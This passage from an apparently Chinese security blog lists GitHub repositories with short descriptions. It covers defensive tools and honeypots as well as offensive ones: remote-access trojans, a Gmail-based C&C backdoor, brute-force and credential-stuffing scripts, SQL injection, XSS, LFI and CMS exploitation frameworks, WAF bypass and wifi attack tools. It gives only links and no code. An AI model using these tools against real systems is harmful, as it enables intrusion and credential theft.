href="https://github.com/mahmoud/boltons">https://github.com/mahmoud/boltons</a><br>python爬虫系统:<br><a href="https://github.com/binux/pyspider">https://github.com/binux/pyspider</a></p>
<h1 id="福利"><a href="#福利" class="headerlink" title="福利"></a>福利</h1><p>微信自动抢红包动态库<br><a href="https://github.com/east520/AutoGetRedEnv">https://github.com/east520/AutoGetRedEnv</a><br>微信抢红包插件（安卓版）<br><a href="https://github.com/geeeeeeeeek/WeChatLuckyMoney">https://github.com/geeeeeeeeek/WeChatLuckyMoney</a><br>hardsed神器:<br><a href="https://github.com/yangyangwithgnu/hardseed">https://github.com/yangyangwithgnu/hardseed</a></p>
<h1 id="甲方安全工程师生存指南"><a href="#甲方安全工程师生存指南" class="headerlink" title="甲方安全工程师生存指南"></a>甲方安全工程师生存指南</h1><p>web索引及日志搜索工具：<br><a href="https://github.com/thomaspatzke/WASE">https://github.com/thomaspatzke/WASE</a><br>开源日志采集器：<br><a href="https://github.com/wgliang/logcool">https://github.com/wgliang/logcool</a><br>扫描CS结构的web debuger<br><a href="https://github.com/Kozea/wdb">https://github.com/Kozea/wdb</a><br>恢复sqlite数据库删除注册信息：<br><a href="https://github.com/aramosf/recoversqlite/">https://github.com/aramosf/recoversqlite/</a><br>gps欺骗检测工具:<br><a href="https://github.com/zxsecurity/gpsnitch">https://github.com/zxsecurity/gpsnitch</a><br>应急处置响应框架:<br><a href="https://github.com/biggiesmallsAG/nightHawkResponse">https://github.com/biggiesmallsAG/nightHawkResponse</a><br>web安全开发指南:<br><a href="https://github.com/FallibleInc/security-guide-for-developers">https://github.com/FallibleInc/security-guide-for-developers</a><br>各个知名厂商漏洞测试报告模板：<br><a href="https://github.com/juliocesarfort/public-pentesting-reports">https://github.com/juliocesarfort/public-pentesting-reports</a><br>linux下恶意代码检测包：<br><a href="https://github.com/rfxn/linux-malware-detect">https://github.com/rfxn/linux-malware-detect</a><br>操作系统运行指标可视化框架：<br><a href="https://github.com/facebook/osquery">https://github.com/facebook/osquery</a><br>恶意代码分析系统：<br><a href="https://github.com/cuckoosandbox/cuckoo">https://github.com/cuckoosandbox/cuckoo</a><br>定期搜索及存储web应用：<br><a href="https://github.com/Netflix/Scumblr">https://github.com/Netflix/Scumblr</a><br>事件响应框架：<br><a href="https://github.com/google/grr">https://github.com/google/grr</a><br>综合主机监控检测平台：<br><a href="https://github.com/ossec/ossec-hids">https://github.com/ossec/ossec-hids</a><br>分布式实时数字取证系统：<br><a href="https://github.com/mozilla/mig">https://github.com/mozilla/mig</a><br>Microsoft &amp; Unix 文件系统及硬盘取证工具：<br><a href="https://github.com/sleuthkit/sleuthkit">https://github.com/sleuthkit/sleuthkit</a></p>
<h1 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h1><p>SSH蜜罐：<br><a href="https://github.com/desaster/kippo">https://github.com/desaster/kippo</a><br>蜜罐集合资源：<br><a href="https://github.com/paralax/awesome-honeypots">https://github.com/paralax/awesome-honeypots</a><br>kippo进阶版蜜罐：<br><a href="https://github.com/micheloosterhof/cowrie">https://github.com/micheloosterhof/cowrie</a><br>SMTP 蜜罐：<br><a href="https://github.com/awhitehatter/mailoney">https://github.com/awhitehatter/mailoney</a><br>web应用程序蜜罐：<br><a href="https://github.com/mushorg/glastopf">https://github.com/mushorg/glastopf</a><br>数据库蜜罐：<br><a href="https://github.com/jordan-wright/elastichoney">https://github.com/jordan-wright/elastichoney</a><br>web蜜罐：<br><a href="https://github.com/atiger77/Dionaea">https://github.com/atiger77/Dionaea</a></p>
<h1 id="远控"><a href="#远控" class="headerlink" title="远控"></a>远控</h1><p>用gmail充当C&amp;C服务器的后门<br><a href="https://github.com/byt3bl33d3r/gcat">https://github.com/byt3bl33d3r/gcat</a><br>开源的远控：<br><a href="https://github.com/UbbeLoL/uRAT">https://github.com/UbbeLoL/uRAT</a><br>c#远控：<br><a href="https://github.com/hussein-aitlahcen/BlackHole">https://github.com/hussein-aitlahcen/BlackHole</a></p>
<h1 id="工具合集"><a href="#工具合集" class="headerlink" title="工具合集"></a>工具合集</h1><p><a href="https://github.com/torque59/Nosql-Exploitation-Framework">https://github.com/torque59/Nosql-Exploitation-Framework</a></p>
<p>(NoSQL扫描/爆破工具)<br><a href="https://github.com/missDronio/blindy">https://github.com/missDronio/blindy</a><br>(MySQL盲注爆破工具)<br><a href="https://github.com/fengxuangit/Fox-scan">https://github.com/fengxuangit/Fox-scan</a><br>(基于SQLMAP的主动和被动资源发现的漏洞扫描工具)<br><a href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a><br>(用于SQL Server审计的powershell脚本)<br><a href="https://github.com/JohnTroony/Blisqy">https://github.com/JohnTroony/Blisqy</a><br>(用于http header中的时间盲注爆破工具，仅针对MySQL / MariaDB)<br><a href="https://github.com/ron190/jsql-injection">https://github.com/ron190/jsql-injection</a><br>(Java编写的SQL注入工具)<br><a href="https://github.com/Hadesy2k/sqliv">https://github.com/Hadesy2k/sqliv</a><br>(基于搜索引擎的批量SQL注入漏洞扫描器)<br><a href="https://github.com/s0md3v/sqlmate">https://github.com/s0md3v/sqlmate</a><br>(在sqlmap基础上增加了目录扫描，hash爆破等功能)<br><a href="https://github.com/m8r0wn/enumdb">https://github.com/m8r0wn/enumdb</a><br>(Mysys以及MSSQL爆破脱裤工具)<br><a href="https://github.com/9tail123/wooscan">https://github.com/9tail123/wooscan</a><br>(批量查询网站在乌云是否存在忽略的sql注入漏洞并自动调用sqlmap测试)<br><a href="https://github.com/lijiejie/htpwdScan">https://github.com/lijiejie/htpwdScan</a><br>(一个简单的HTTP暴力破解，撞库攻击脚本)<br><a href="https://github.com/ysrc/F-Scrack">https://github.com/ysrc/F-Scrack</a><br>(对各类服务进行弱口令检测的脚本)<br><a href="https://github.com/Mebus/cupp">https://github.com/Mebus/cupp</a><br>(根据用户习惯生成弱口令探测字典脚本)<br><a href="https://github.com/netxfly/crack_ssh">https://github.com/netxfly/crack_ssh</a><br>(Go写的协程版的ssh \redis \ mongodb弱口令破解工具)<br><a href="https://github.com/LandGrey/pydictor">https://github.com/LandGrey/pydictor</a><br>(暴力破解字典建立工具)<br><a href="https://github.com/shengqi158/weak_password_detect">https://github.com/shengqi158/weak_password_detect</a><br>(多线程探测弱口令)<br><a href="https://github.com/s0md3v/Blazy">https://github.com/s0md3v/Blazy</a><br>(支持测试CSRF，Clickjacking，Cloudflare和WAF的弱口令探测器)<br><a href="https://github.com/MooseDojo/myBFF">https://github.com/MooseDojo/myBFF</a><br>(对CiscoVPN，Citrix Gateway等各类服务进行弱口令检测的脚本)<br><a href="https://github.com/rapid7/IoTSeeker">https://github.com/rapid7/IoTSeeker</a><br>(物联网设备默认密码扫描检测工具)<br><a href="https://github.com/shodan-labs/iotdb">https://github.com/shodan-labs/iotdb</a><br>(使用nmap扫描IoT设备)<br><a href="https://github.com/googleinurl/RouterHunterBR">https://github.com/googleinurl/RouterHunterBR</a><br>(路由器设备漏洞扫描利用)<br><a href="https://github.com/scu-igroup/telnet-scanner">https://github.com/scu-igroup/telnet-scanner</a><br>(Telnet服务密码撞库)<br><a href="https://github.com/viraintel/OWASP-Nettacker">https://github.com/viraintel/OWASP-Nettacker</a><br>(自动化信息搜集及渗透测试工具，比较适用于IoT扫描)<br><a href="https://github.com/threat9/routersploit">https://github.com/threat9/routersploit</a><br>(嵌入式设备漏洞扫描及利用工具)<br><a href="https://github.com/shawarkhanethicalhacker/BruteXSS">https://github.com/shawarkhanethicalhacker/BruteXSS</a><br>(一款XSS扫描器，可暴力注入参数)<br><a href="https://github.com/1N3/XSSTracer">https://github.com/1N3/XSSTracer</a><br>(小型XSS扫描器，也可检测CRLF，XSS，点击劫持的)<br><a href="https://github.com/0x584A/fuzzXssPHP">https://github.com/0x584A/fuzzXssPHP</a><br>(PHP版本的反射型xss扫描)<br><a href="https://github.com/chuhades/xss_scan">https://github.com/chuhades/xss_scan</a><br>(批量扫描XSS的python脚本)<br><a href="https://github.com/BlackHole1/autoFindXssAndCsrf">https://github.com/BlackHole1/autoFindXssAndCsrf</a><br>(自动化检测页面是否存在XSS和跨站请求伪造漏洞的浏览器插件)<br><a href="https://github.com/shogunlab/shuriken">https://github.com/shogunlab/shuriken</a><br>(使用命令行进行XSS批量检测)<br><a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a><br>(可识别和绕过WAF的XSS扫描工具)<br><a href="https://github.com/stamparm/DSXS">https://github.com/stamparm/DSXS</a><br>(支持GET，POST方式的高效XSS扫描器)<br><a href="https://github.com/ysrc/xunfeng">https://github.com/ysrc/xunfeng</a><br>(网络资产识别引擎，漏洞检测引擎)<br><a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a><br>(企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱，子域名，主持人)<br><a href="https://github.com/x0day/Multisearch-v2">https://github.com/x0day/Multisearch-v2</a><br>(Bing，google，360，zoomeye 等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息)<br><a href="https://github.com/Ekultek/Zeus-Scanner">https://github.com/Ekultek/Zeus-Scanner</a><br>(能成抓取搜索引擎隐藏的url，并交由sqlmap，nmap扫描)<br><a href="https://github.com/0xbug/Biu-framework">https://github.com/0xbug/Biu-framework</a><br>(企业内网基础服务安全扫描框架)<br><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a><br>(github Repo信息搜集工具)<br><a href="https://github.com/shengqi158/svnhack">https://github.com/shengqi158/svnhack</a><br>(.svn文件夹泄漏利用工具)<br><a href="https://github.com/repoog/GitPrey">https://github.com/repoog/GitPrey</a><br>(GitHub敏感信息扫描工具)<br><a href="https://github.com/0xbug/Hawkeye">https://github.com/0xbug/Hawkeye</a><br>(企业资产，敏感信息GitHub泄露监控系统)<br><a href="https://github.com/lianfeng30/githubscan">https://github.com/lianfeng30/githubscan</a><br>(根据企业关键词进行项目检索以及相应敏感文件和文件内容扫描的工具)<br><a href="https://github.com/UnkL4b/GitMiner">https://github.com/UnkL4b/GitMiner</a><br>(github敏感信息搜索工具)<br><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>( .git文件夹泄漏利用工具)<br><a href="https://github.com/dxa4481/truffleHog">https://github.com/dxa4481/truffleHog</a><br>(GitHub敏感信息扫描工具，包括检测提交等)<br><a href="https://github.com/1N3/Goohak">https://github.com/1N3/Goohak</a><br>(自动化对指定域名进行Google hacking搜索并收集信息)<br><a href="https://github.com/UKHomeOffice/repo-security-scanner">https://github.com/UKHomeOffice/repo-security-scanner</a><br>(用于搜索git的承诺中的敏感信息，例如密码，私钥等的客户端工具)<br><a href="https://github.com/FeeiCN/GSIL">https://github.com/FeeiCN/GSIL</a><br>(Github敏感信息泄露扫描)<br><a href="https://github.com/MiSecurity/x-patrol">https://github.com/MiSecurity/x-patrol</a><br>(Github泄露巡航工具)<br><a href="https://github.com/1N3/BlackWidow">https://github.com/1N3/BlackWidow</a><br>(Web站点信息搜集工具，包括邮箱，电话等信息)<br><a href="https://github.com/anshumanbh/git-all-secrets">https://github.com/anshumanbh/git-all-secrets</a><br>(集合多个开源GitHub敏感信息扫描的企业信息泄露巡航工具)<br><a href="https://github.com/s0md3v/Photon">https://github.com/s0md3v/Photon</a><br>(可以提取网址，电子邮件，文件，网站帐户等的高速爬虫)<br><a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a><br>(一款简单的webshell检测工具)<br><a href="https://github.com/Tencent/HaboMalHunter">https://github.com/Tencent/HaboMalHunter</a><br>(哈勃分析系统，LINUX系统病毒分析及安全检测)<br><a href="https://github.com/PlagueScanner/PlagueScanner">https://github.com/PlagueScanner/PlagueScanner</a><br>(使用python实现的集成ClamAV，ESET，Bitdefender的反病毒引擎)<br><a href="https://github.com/nbs-system/php-malware-finder">https://github.com/nbs-system/php-malware-finder</a><br>(一款高效率PHP-webshell扫描工具)<br><a href="https://github.com/emposha/PHP-Shell-Detector/">https://github.com/emposha/PHP-Shell-Detector/</a><br>(测试效率高达99%的webshell检测工具)<br><a href="https://github.com/erevus-cn/scan_webshell">https://github.com/erevus-cn/scan_webshell</a><br>(一款简洁的的Webshell扫描工具)<br><a href="https://github.com/emposha/Shell-Detector">https://github.com/emposha/Shell-Detector</a><br>(Webshell扫描工具，支持php / perl / asp / aspx webshell扫描)<br><a href="https://github.com/m4rco-/dorothy2">https://github.com/m4rco-/dorothy2</a><br>(一款木马，僵尸网络分析框架)<br><a href="https://github.com/droidefense/engine">https://github.com/droidefense/engine</a><br>(高级安卓木马病毒分析框架)<br><a href="https://github.com/lcatro/network_backdoor_scanner">https://github.com/lcatro/network_backdoor_scanner</a><br>(基于网络流量的内网探测框架)<br><a href="https://github.com/fdiskyou/hunter">https://github.com/fdiskyou/hunter</a><br>(调用Windows API枚举用户登录信息)<br><a href="https://github.com/BlackHole1/WebRtcXSS">https://github.com/BlackHole1/WebRtcXSS</a><br>(自动化利用XSS入侵内网)<br><a href="https://github.com/ring04h/wyportmap">https://github.com/ring04h/wyportmap</a><br>(目标端口扫描+系统服务指纹识别)<br><a href="https://github.com/ring04h/weakfilescan">https://github.com/ring04h/weakfilescan</a><br>(动态多线程敏感信息泄露检测工具)<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>(WAF产品指纹识别)<br><a href="https://github.com/rbsec/sslscan">https://github.com/rbsec/sslscan</a><br>(SSL类型识别)<br><a href="https://github.com/urbanadventurer/whatweb">https://github.com/urbanadventurer/whatweb</a><br>(Web指纹识别)<br><a href="https://github.com/tanjiti/FingerPrint">https://github.com/tanjiti/FingerPrint</a><br>(Web应用指纹识别)<br><a href="https://github.com/nanshihui/Scan-T">https://github.com/nanshihui/Scan-T</a><br>(网络爬虫式指纹识别)<br><a href="https://github.com/OffensivePython/Nscan">https://github.com/OffensivePython/Nscan</a><br>(基于Masscan和Zmap的网络扫描器)<br><a href="https://github.com/ywolf/F-NAScan">https://github.com/ywolf/F-NAScan</a><br>(网络资产信息扫描，ICMP存活探测，端口扫描，端口指纹服务识别)<br><a href="https://github.com/ywolf/F-MiddlewareScan">https://github.com/ywolf/F-MiddlewareScan</a><br>(中间件扫描)<br><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>(web路径收集与扫描)<br><a href="https://github.com/x0day/bannerscan">https://github.com/x0day/bannerscan</a><br>(C段横幅与路径扫描)<br><a href="https://github.com/RASSec/RASscan">https://github.com/RASSec/RASscan</a><br>(端口服务扫描)<br><a href="https://github.com/3xp10it/bypass_waf">https://github.com/3xp10it/bypass_waf</a><br>(waf自动暴破)<br><a href="https://github.com/3xp10it/xcdn">https://github.com/3xp10it/xcdn</a><br>(尝试找出cdn背后的真实ip)<br><a href="https://github.com/Xyntax/BingC">https://github.com/Xyntax/BingC</a><br>(基于Bing搜索引擎的C段/旁站查询，多线程，支持API)<br><a href="https://github.com/Xyntax/DirBrute">https://github.com/Xyntax/DirBrute</a><br>(多线程WEB目录爆破工具)<br><a href="https://github.com/zer0h/httpscan">https://github.com/zer0h/httpscan</a><br>(一个爬虫式的网段Web主机发现小工具)<br><a href="https://github.com/lietdai/doom">https://github.com/lietdai/doom</a><br>(Thorn上实现的分布式任务分发的ip端口漏洞扫描器)<br><a href="https://github.com/chichou/grab.js">https://github.com/chichou/grab.js</a><br>(类似zgrab的快速TCP指纹抓取解析工具，支持更多协议)<br><a href="https://github.com/Nitr4x/whichCDN">https://github.com/Nitr4x/whichCDN</a><br>(CDN识别，检测)<br><a href="https://github.com/secfree/bcrpscan">https://github.com/secfree/bcrpscan</a><br>(基于爬虫的web路径扫描器)<br><a href="https://github.com/mozilla/ssh_scan">https://github.com/mozilla/ssh_scan</a><br>(服务器ssh配置信息扫描)<br><a href="https://github.com/18F/domain-scan">https://github.com/18F/domain-scan</a><br>(针对域名及其子域名的资产数据检测/扫描，包括http / https检测等)<br><a href="https://github.com/ggusoft/inforfinder">https://github.com/ggusoft/inforfinder</a><br>(域名资产收集及指纹识别工具)<br><a href="https://github.com/boy-hack/gwhatweb">https://github.com/boy-hack/gwhatweb</a><br>(CMS识别python gevent实现)<br><a href="https://github.com/Mosuan/FileScan">https://github.com/Mosuan/FileScan</a><br>(敏感文件扫描/二次判断降低误报率/扫描内容规则化/多目录扫描)<br><a href="https://github.com/Xyntax/FileSensor">https://github.com/Xyntax/FileSensor</a><br>(基于爬虫的动态敏感文件探测工具)<br><a href="https://github.com/deibit/cansina">https://github.com/deibit/cansina</a><br>(web路径扫描工具)<br><a href="https://github.com/0xbug/Howl">https://github.com/0xbug/Howl</a><br>(网络设备web服务指纹扫描与检索)<br><a href="https://github.com/mozilla/cipherscan">https://github.com/mozilla/cipherscan</a><br>(目标主机服务ssl类型识别)<br><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a><br>(Web应用fuzz工具，框架，同时可用于web路径/服务扫描)<br><a href="https://github.com/s0md3v/Breacher">https://github.com/s0md3v/Breacher</a><br>(多线程的后台路径扫描器，也可用于发现重定向漏洞后执行)<br><a href="https://github.com/ztgrace/changeme">https://github.com/ztgrace/changeme</a><br>(弱口令扫描器，不仅支持普通登录页，也支持ssh，mongodb等组件)<br><a href="https://github.com/medbenali/CyberScan">https://github.com/medbenali/CyberScan</a><br>(渗透测试辅助工具，支持分析数据包，解码，端口扫描，IP地址分析等)<br><a href="https://github.com/m0nad/HellRaiser">https://github.com/m0nad/HellRaiser</a><br>(基于nmap的扫描器，与cve漏洞关联)<br><a href="https://github.com/scipag/vulscan">https://github.com/scipag/vulscan</a><br>(基于nmap的高级漏洞扫描器，命令行环境使用)<br><a href="https://github.com/jekyc/wig">https://github.com/jekyc/wig</a><br>(web应用信息搜集工具)<br><a href="https://github.com/eldraco/domain_analyzer">https://github.com/eldraco/domain_analyzer</a><br>(围绕web服务的域名进行信息收集和“域传送”等漏洞扫描，也支持针对背后的服务器端口扫描等)<br><a href="https://github.com/cloudtracer/paskto">https://github.com/cloudtracer/paskto</a><br>(基于Nikto扫描规则的被动式路径扫描以及信息爬虫)<br><a href="https://github.com/zerokeeper/WebEye">https://github.com/zerokeeper/WebEye</a><br>(快速识别WEB服务器类型，CMS类型，WAF类型，WHOIS信息，以及语言框架)<br><a href="https://github.com/m3liot/shcheck">https://github.com/m3liot/shcheck</a><br>(用于检查web服务的http header的安全性)<br><a href="https://github.com/aipengjie/sensitivefilescan">https://github.com/aipengjie/sensitivefilescan</a><br>(一款高效快捷的敏感文件扫描工具)<br><a href="https://github.com/fnk0c/cangibrina">https://github.com/fnk0c/cangibrina</a><br>(通过字典穷举，google，robots.txt等途径的跨平台后台管理路径扫描器)<br><a href="https://github.com/n4xh4ck5/CMSsc4n">https://github.com/n4xh4ck5/CMSsc4n</a><br>(常规CMS指纹识别)<br><a href="https://github.com/Ekultek/WhatWaf">https://github.com/Ekultek/WhatWaf</a><br>(WAF指纹识别及自动化绕过工具)<br><a href="https://github.com/dzonerzy/goWAPT">https://github.com/dzonerzy/goWAPT</a><br>(网络应用模糊工具，框架，同时可用于网络路径/服务扫描)<br><a href="https://github.com/blackye/webdirdig">https://github.com/blackye/webdirdig</a><br>(web敏感目录/信息泄漏扫描脚本)<br><a href="https://github.com/GitHackTools/BillCipher">https://github.com/GitHackTools/BillCipher</a><br>(用于网站或IP地址的信息收集工具)<br><a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a><br>(通过扫描全网获得真实IP的自动化程序)<br><a href="https://github.com/boy-hack/w11scan">https://github.com/boy-hack/w11scan</a><br>(分布式WEB指纹识别平台)<br><a href="https://github.com/Nekmo/dirhunt">https://github.com/Nekmo/dirhunt</a><br>(爬虫式web目录扫描工具)<br><a href="https://github.com/blackye/Jenkins">https://github.com/blackye/Jenkins</a><br>(Jenkins漏洞探测，用户抓取爆破)<br><a href="https://github.com/code-scan/dzscan">https://github.com/code-scan/dzscan</a><br>(首款集成化的Discuz扫描工具)<br><a href="https://github.com/chuhades/CMS-Exploit-Framework">https://github.com/chuhades/CMS-Exploit-Framework</a><br>(一款简洁优雅的CMS扫描利用框架)<br><a href="https://github.com/lijiejie/IIS_shortname_Scanner">https://github.com/lijiejie/IIS_shortname_Scanner</a><br>(IIS短文件名暴力枚举漏洞利用工具)<br><a href="https://github.com/riusksk/FlashScanner">https://github.com/riusksk/FlashScanner</a><br>(flashxss扫描)<br><a href="https://github.com/coffeehb/SSTIF">https://github.com/coffeehb/SSTIF</a><br>(一个起毛服务器端模板注入漏洞的半自动化工具)<br><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a><br>(服务器端模板注入漏洞检测与利用工具)<br><a href="https://github.com/cr0hn/dockerscan(Docker%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7)">https://github.com/cr0hn/dockerscan(Docker扫描工具)</a><br><a href="https://github.com/m4ll0k/WPSeku">https://github.com/m4ll0k/WPSeku</a><br>(一款精简的wordpress扫描工具)<br><a href="https://github.com/rastating/wordpress-exploit-framework">https://github.com/rastating/wordpress-exploit-framework</a> (集成化wordpress漏洞利用框架)<br><a href="https://github.com/ilmila/J2EEScan">https://github.com/ilmila/J2EEScan</a><br>(用于扫描J2EE应用的一款burpsuite插件)<br><a href="https://github.com/riusksk/StrutScan">https://github.com/riusksk/StrutScan</a><br>(一款基于perl的strut2的历史漏洞扫描器)<br><a href="https://github.com/D35m0nd142/LFISuite">https://github.com/D35m0nd142/LFISuite</a><br>(本地文件包含漏洞利用及扫描工具，支持反弹shell)<br><a href="https://github.com/0x4D31/salt-scanner">https://github.com/0x4D31/salt-scanner</a><br>(基于Salt Open以及Vulners Linux Audit API的linux漏洞扫描器，支持与JIRA，slack平台结合使用)<br><a href="https://github.com/tijme/angularjs-csti-scanner">https://github.com/tijme/angularjs-csti-scanner</a><br>(自动化探测客户端AngularJS模板注入漏洞工具)<br><a href="https://github.com/irsdl/IIS-ShortName-Scanner">https://github.com/irsdl/IIS-ShortName-Scanner</a><br>(Java编写的IIS短文件名暴力枚举漏洞利用工具)<br><a href="https://github.com/swisskyrepo/Wordpresscan">https://github.com/swisskyrepo/Wordpresscan</a><br>(基于WPScan以及WPSeku的优化版wordpress扫描器)<br><a href="https://github.com/CHYbeta/cmsPoc">https://github.com/CHYbeta/cmsPoc</a><br>(CMS渗透测试框架)<br><a href="https://github.com/rudSarkar/crlf-injector">https://github.com/rudSarkar/crlf-injector</a><br>(CRLF注入漏洞批量扫描)<br><a href="https://github.com/3gstudent/Smbtouch-Scanner">https://github.com/3gstudent/Smbtouch-Scanner</a><br>(自动化扫描内网中存在的由影子经纪人泄露的ETERNAL系列漏洞)<br><a href="https://github.com/utiso/dorkbot">https://github.com/utiso/dorkbot</a><br>(通过定制化的谷歌搜索引擎进行漏洞页面搜寻及扫描)<br><a href="https://github.com/OsandaMalith/LFiFreak">https://github.com/OsandaMalith/LFiFreak</a><br>(本地文件包含漏洞利用及扫描工具，支持反弹shell)<br><a href="https://github.com/mak-/parameth">https://github.com/mak-/parameth</a><br>(用于枚举脚本的GET / POST未知参数字段)<br><a href="https://github.com/Lucifer1993/struts-scan">https://github.com/Lucifer1993/struts-scan</a><br>(struts2的漏洞全版本检测和利用工具)<br><a href="https://github.com/hahwul/a2sv">https://github.com/hahwul/a2sv</a><br>(SSL漏洞扫描，例如心脏滴血漏洞等)<br><a href="https://github.com/NullArray/DorkNet">https://github.com/NullArray/DorkNet</a><br>(基于搜索引擎的漏洞网页搜寻)<br><a href="https://github.com/NickstaDB/BaRMIe">https://github.com/NickstaDB/BaRMIe</a><br>(用于攻击爆破Java RemoteMethod Invocation服务的工具)<br><a href="https://github.com/RetireJS/grunt-retire">https://github.com/RetireJS/grunt-retire</a><br>(扫描js扩展库的常见漏洞)<br><a href="https://github.com/kotobukki/BDA">https://github.com/kotobukki/BDA</a><br>(针对的hadoop /火花等大数据平台的的漏洞探测工具)<br><a href="https://github.com/jagracey/Regex-DoS">https://github.com/jagracey/Regex-DoS</a><br>(RegEx拒绝服务扫描器)<br><a href="https://github.com/milesrichardson/docker-onion-nmap">https://github.com/milesrichardson/docker-onion-nmap</a><br>(使用NMAP扫描的Tor网络上隐藏的“洋葱”服务)<br><a href="https://github.com/Moham3dRiahi/XAttacker">https://github.com/Moham3dRiahi/XAttacker</a><br>(Web CMS Exploit工具，包含针对主流CMS的66个不同的漏洞利用)<br><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a><br>(一个迷你的信息泄漏批量扫描脚本)<br><a href="https://github.com/almandin/fuxploider">https://github.com/almandin/fuxploider</a><br>(文件上传漏洞扫描器及利用工具)<br><a href="https://github.com/Ice3man543/SubOver">https://github.com/Ice3man543/SubOver</a><br>(子域名接管漏洞检测工具，支持30+云服务托管检测)<br><a href="https://github.com/Jamalc0m/wphunter">https://github.com/Jamalc0m/wphunter</a><br>(WordPress的漏洞扫描器，同时也支持敏感文件泄露扫描)<br><a href="https://github.com/retirejs/retire.js">https://github.com/retirejs/retire.js</a><br>(检测网站依赖的JavaScript库中存在的已知通用漏洞)<br><a href="https://github.com/3xp10it/xupload">https://github.com/3xp10it/xupload</a><br>(自动检测上传功能是否可上传webshell)<br><a href="https://github.com/mobrine-mob/M0B-tool">https://github.com/mobrine-mob/M0B-tool</a><br>(CMS指纹识别及自动化渗透测试框架)<br><a href="https://github.com/rezasp/vbscan">https://github.com/rezasp/vbscan</a><br>(论坛框架vBulletin黑盒漏洞扫描器)<br><a href="https://github.com/MrSqar-Ye/BadMod">https://github.com/MrSqar-Ye/BadMod</a><br>(CMS指纹识别及自动化渗透测试框架)<br><a href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a><br>(CMS漏洞检测和利用套件)<br><a href="https://github.com/cloudsploit/scans">https://github.com/cloudsploit/scans</a><br>(AWS安全审计工具)<br><a href="https://github.com/radenvodka/SVScanner">https://github.com/radenvodka/SVScanner</a><br>(针对wp，magento，joomla等CMS的漏洞扫描器及自动利用工具)<br><a href="https://github.com/rezasp/joomscan">https://github.com/rezasp/joomscan</a><br>(OWASP旗下joomla漏洞扫描项目)<br><a href="https://github.com/6IX7ine/djangohunter">https://github.com/6IX7ine/djangohunter</a><br>(用于检测因错误配置导致敏感信息暴露的Django应用程序)<br><a href="https://github.com/savio-code/fern-wifi-cracker/">https://github.com/savio-code/fern-wifi-cracker/</a><br>(无线安全审计工具)<br><a href="https://github.com/m4n3dw0lf/PytheM">https://github.com/m4n3dw0lf/PytheM</a><br>(Python网络/渗透测试工具)<br><a href="https://github.com/P0cL4bs/WiFi-Pumpkin">https://github.com/P0cL4bs/WiFi-Pumpkin</a><br>(无线安全渗透测试套件)<br><a href="https://github.com/MisterBianco/BoopSuite">https://github.com/MisterBianco/BoopSuite</a><br>(无线网络审计工具，支持2-5GHZ频段)<br><a href="https://github.com/DanMcInerney/LANs.py">https://github.com/DanMcInerney/LANs.py</a><br>(ARP欺骗，无线网络劫持)<br><a href="https://github.com/besimaltnok/PiFinger">https://github.com/besimaltnok/PiFinger</a><br>(检查wifi是否是“大菠萝”所开放的热点，并给予网络评分)<br><a href="https://github.com/derv82/wifite2">https://github.com/derv82/wifite2</a><br>(自动化无线网络攻击工具wifite的重构版本)<br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a><br>(基于BBScan via.lijiejie的本地网络扫描)<br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a><br>(基于JavaScript的的本地网络扫描)<br><a href="https://github.com/wufeifei/cobra">https://github.com/wufeifei/cobra</a><br>(白盒代码安全审计系统)<br><a href="https://github.com/OneSourceCat/phpvulhunter">https://github.com/OneSourceCat/phpvulhunter</a><br>(静态PHP代码审计)<br><a href="https://github.com/Qihoo360/phptrace">https://github.com/Qihoo360/phptrace</a><br>(跟踪，分析PHP运行情况的工具)<br><a href="https://github.com/ajinabraham/NodeJsScan">https://github.com/ajinabraham/NodeJsScan</a><br>(的NodeJS应用代码审计)<br><a href="https://github.com/shengqi158/pyvulhunter">https://github.com/shengqi158/pyvulhunter</a><br>(Python应用审计)<br><a href="https://github.com/presidentbeef/brakeman">https://github.com/presidentbeef/brakeman</a><br>(Ruby on Rails应用静态代码分析)<br><a href="https://github.com/python-security/pyt">https://github.com/python-security/pyt</a><br>(Python应用静态代码审计)<br><a href="https://github.com/m4ll0k/WPSploit">https://github.com/m4ll0k/WPSploit</a><br>(WordPress插件代码安全审计)<br><a href="https://github.com/emanuil/php-reaper">https://github.com/emanuil/php-reaper</a><br>(用于扫描PHP应用程序中可能存在SQL漏洞的ADOdb代码)<br><a href="https://github.com/lowjoel/phortress">https://github.com/lowjoel/phortress</a><br>(用于检测潜在安全漏洞的PHP静态代码分析工具)<br><a href="https://github.com/az0ne/AZScanner">https://github.com/az0ne/AZScanner</a><br>(自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测)<br><a href="https://github.com/blackye/lalascan">https://github.com/blackye/lalascan</a><br>(集合owasp top10漏洞扫描和边界资产发现能力的分布式web漏洞扫描框架)<br><a href="https://github.com/blackye/BkScanner">https://github.com/blackye/BkScanner</a><br>(BkScanner分布式，插件化web漏洞扫描器)<br><a href="https://github.com/ysrc/GourdScanV2">https://github.com/ysrc/GourdScanV2</a><br>(ysrc出品的被动式漏洞扫描工具)<br><a href="https://github.com/netxfly/passive_scan">https://github.com/netxfly/passive_scan</a><br>(基于http代理的web漏洞扫描器)<br><a 